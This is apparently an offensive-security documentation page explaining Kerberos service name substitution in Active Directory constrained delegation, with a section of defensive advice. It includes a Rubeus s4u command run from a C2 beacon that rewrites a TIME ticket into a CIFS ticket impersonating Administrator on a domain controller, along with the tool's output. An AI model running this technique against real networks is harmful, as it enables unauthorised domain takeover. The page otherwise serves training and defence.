---
title: "Service Name Substitution"
date: 2026-09-25
weight: 6
type: docs
tags:
  - Kerberos
  - Constrained Delegation
  - Service Name Substitution
  - Active Directory
---

## What service name substitution is

Service name substitution is a technique that lets an adversary "swap" a service ticket issued for one service so that it works against a different service. That phrasing sounds odd at first, so it is worth unpacking why it is possible.

Both the AS-REP and the TGS-REP messages are built on the same underlying structure, `KDC-REP`. What actually sits inside the `ticket[5]` and `enc-part[6]` fields depends on which reply is being sent; for a TGS-REP those are a service ticket and an `EncTGSRepPart` respectively.

The Ticket structure carries its own encrypted section, holding details such as the principal the ticket was issued to and a copy of the service session key. The important observation is that the SPN itself, the `sname[2]` field, is *not* part of that encrypted section.

Because that field sits in the clear, an adversary who holds a service ticket for, say, HTTP/PC1 can overwrite it with a different SPN such as CIFS/PC1. The ticket remains valid, because `sname` is also excluded from the ticket's checksum, so tampering with it leaves the integrity check intact.

There is one firm constraint. Substitution only works when the replacement SPN runs under the same account as the original service. You can turn HTTP/PC1 into CIFS/PC1, but you cannot turn HTTP/PC1 into CIFS/PC2. The reason is cryptographic: when two services share a single account, the session keys inside their tickets are protected with the same key. The substituted service can therefore decrypt the ticket without any trouble, even though the KDC never issued a TGS-REP for that particular SPN.

## Where it pays off

This trick is especially valuable in constrained delegation, where the service you are permitted to delegate to is not, on its own, much use for lateral movement. Consider a case where *hq-wks-07* is allowed to delegate only to the TIME service on *hq-dc-02*:

```powershell
sAMAccountName: HQ-WKS-07$
msDS-AllowedToDelegateTo: time/hq-dc-02.arcadia.local, time/hq-dc-02
```

On paper that is a dead end. TIME, unlike CIFS, does not hand you remote access to the machine. Service name substitution changes the calculation entirely: you request a ticket for TIME as allowed, then rewrite the service name in the returned ticket from TIME to CIFS, or to whatever else is useful. Rubeus exposes this through the `/altservice` parameter.

The walkthrough below assumes protocol transition is enabled.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:hq-wks-07$ /msdsspn:time/hq-dc-02 /altservice:cifs /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
```

Where:

- `/user` is the principal (typically a computer) that carries the delegation.
- `/msdsspn` is the service the principal is permitted to delegate to.
- `/altservice` is the service to substitute into the final ticket.
- `/ticket` is the principal's TGT.
- `/impersonateuser` is the user to impersonate.

`/altservice` will also accept a comma-separated list, for example `/altservice:cifs,host,http`, which produces three ready-to-inject tickets in one pass.

```powershell
[*] Action: S4U

[*] Building S4U2self request for: 'HQ-WKS-07$@ARCADIA.LOCAL'
[*] Using domain controller: hq-dc-02.arcadia.local (172.16.40.10)
[*] Sending S4U2self request to 172.16.40.10:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'HQ-WKS-07$@ARCADIA.LOCAL'
[*] base64(ticket.kirbi):

      doIF8[...snip...]MtMSQ=

[*] Impersonating user 'Administrator' to target SPN 'time/hq-dc-02'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Building S4U2proxy request for service: 'time/hq-dc-02'
[*] Using domain controller: hq-dc-02.arcadia.local (172.16.40.10)
[*] Sending S4U2proxy request to domain controller 172.16.40.10:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/hq-dc-02':

      doIGf[...snip...]RjLTE=
```

The resulting ticket is a CIFS ticket for *hq-dc-02*, despite the delegation policy only ever permitting TIME. From here it can be injected and used exactly like any other CIFS ticket to reach the target's file system.

## Defensive considerations

The uncomfortable takeaway for defenders is that an entry in `msDS-AllowedToDelegateTo` cannot be judged safe merely because the named service looks harmless. Because the SPN is interchangeable across services on the same account, delegation to a benign service such as TIME is effectively delegation to every service that account hosts, CIFS and HOST included. Review delegation grants with that in mind, and treat any constrained delegation to a domain controller or other tier-0 host as high risk regardless of the specific SPN listed. Where protocol transition is enabled on such an account, the exposure is greater still, since the attacker can select the impersonated user freely; disable it unless there is a clear, documented need. As a detection aid, S4U2proxy activity that is immediately followed by a service-name substitution is a strong signal, as legitimate applications request the service they actually intend to use.

## Further reading

- [Microsoft Open Specifications: S4U2proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a)
- [Microsoft Open Specifications: KDC-REP structure](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/)
- [GhostPack Rubeus documentation](https://github.com/GhostPack/Rubeus)